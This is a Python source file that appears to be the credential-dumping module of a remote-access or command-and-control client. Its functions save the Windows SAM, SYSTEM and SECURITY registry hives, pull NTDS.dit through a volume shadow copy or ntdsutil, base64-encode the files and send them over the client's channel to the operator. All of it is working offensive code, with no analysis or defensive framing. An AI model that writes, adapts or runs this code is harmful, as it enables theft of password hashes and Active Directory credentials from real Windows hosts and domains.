import os
import base64
import subprocess
import tempfile


def dump_sam(protocol):
    if os.name != 'nt':
        protocol.send('[-] SAM dump is Windows-only')
        return
    tmp = tempfile.gettempdir()
    sam = os.path.join(tmp, 'sam.save')
    sys = os.path.join(tmp, 'system.save')
    try:
        subprocess.run(
            f'reg save HKLM\\SAM "{sam}" /y',
            shell=True, capture_output=True, check=True)
        subprocess.run(
            f'reg save HKLM\\SYSTEM "{sys}" /y',
            shell=True, capture_output=True, check=True)
        for path, name in [(sam, 'SAM'), (sys, 'SYSTEM')]:
            size = os.path.getsize(path)
            protocol.send(f'[+] {name}: {size} bytes')
            with open(path, 'rb') as f:
                protocol.send(base64.b64encode(f.read()).decode())
    except subprocess.CalledProcessError as e:
        protocol.send(f'[-] SAM dump failed: {e}')
    finally:
        for p in (sam, sys):
            try:
                os.remove(p)
            except OSError:
                pass


def dump_ntds_dit(protocol):
    if os.name != 'nt':
        protocol.send('[-] NTDS dump is Windows-only')
        return
    try:
        result = subprocess.run(
            'vssadmin create shadow /for=C:',
            shell=True, capture_output=True, text=True)
        for line in result.stdout.splitlines():
            if 'Volume Name:' in line or 'Shadow Copy Volume Name' in line:
                vol = line.split(':', 1)[-1].strip().rstrip('\\')
                ntds = os.path.join(vol, 'Windows', 'NTDS', 'ntds.dit')
                if os.path.exists(ntds):
                    protocol.send(f'[+] NTDS.dit via VSS: {os.path.getsize(ntds)} bytes')
                    from client.modules.file_ops import upload_file
                    upload_file(protocol, ntds)
                    return
        subprocess.run(
            'ntdsutil "ac i ntds" "ifm" "create full c:\\temp\\ntds" q q',
            shell=True, capture_output=True)
        ntds_path = os.path.join(
            os.environ.get('SYSTEMDRIVE', 'C:'), 'temp', 'ntds',
            'Active Directory', 'ntds.dit')
        if os.path.exists(ntds_path):
            from client.modules.file_ops import upload_file
            upload_file(protocol, ntds_path)
        else:
            protocol.send('[-] Could not locate NTDS.dit')
    except Exception as e:
        protocol.send(f'[-] NTDS dump failed: {e}')


def dump_cached_creds(protocol):
    if os.name != 'nt':
        protocol.send('[-] Cached credentials dump is Windows-only')
        return
    tmp = os.path.join(tempfile.gettempdir(), 'security.save')
    try:
        subprocess.run(
            f'reg save HKLM\\SECURITY "{tmp}" /y',
            shell=True, capture_output=True, check=True)
        size = os.path.getsize(tmp)
        protocol.send(f'[+] SECURITY hive: {size} bytes')
        with open(tmp, 'rb') as f:
            protocol.send(base64.b64encode(f.read()).decode())
    except subprocess.CalledProcessError as e:
        protocol.send(f'[-] SECURITY dump failed: {e}')
    finally:
        try:
            os.remove(tmp)
        except OSError:
            pass
